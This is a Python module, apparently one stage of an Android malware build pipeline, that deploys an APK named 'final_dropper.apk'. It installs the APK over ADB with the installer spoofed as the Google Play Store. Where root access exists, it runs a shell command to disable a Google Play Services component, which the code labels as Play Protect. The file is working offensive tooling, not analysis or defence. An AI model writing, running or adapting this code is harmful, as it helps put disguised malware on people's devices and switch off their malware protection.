"""Phase 10: Deployment (PC)."""
import os
from config import OUTPUT_DIR
from utils.logger import setup_logger
from utils.adb_helper import adb_install, adb_shell

logger = setup_logger()

def run(input_apk, final_name="final_dropper.apk"):
    logger.info("="*60)
    logger.info("[*] PHASE 10: Deployment")
    logger.info("="*60)

    # Copy to output
    final_path = str(OUTPUT_DIR / final_name)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(input_apk, "rb") as src, open(final_path, "wb") as dst:
        dst.write(src.read())

    # ADB install with Play Store spoof (skip if no device)
    try:
        ok, out, err = adb_install(final_path, spoof_store="com.android.vending", timeout=120)
        if ok:
            logger.info("[+] APK installed on device")
        else:
            logger.warning(f"[!] Install failed: {err}")

        # Verify
        out = adb_shell("pm list packages com.google.android.gms")
        logger.info(f"    GMS check: {out[:100]}")

        # If root, disable Play Protect service
        out = adb_shell("su -c 'pm disable com.google.android.gms/.chimera.GmsIntentOperationService' 2>/dev/null || echo 'no_root'")
        if "no_root" not in out:
            logger.info("[+] Play Protect service disabled (root)")
    except Exception as adb_err:
        logger.warning(f"[!] Phase 10 ADB skipped: {adb_err}")

    logger.info(f"[+] Phase 10 Complete: {final_path}")
    return final_path
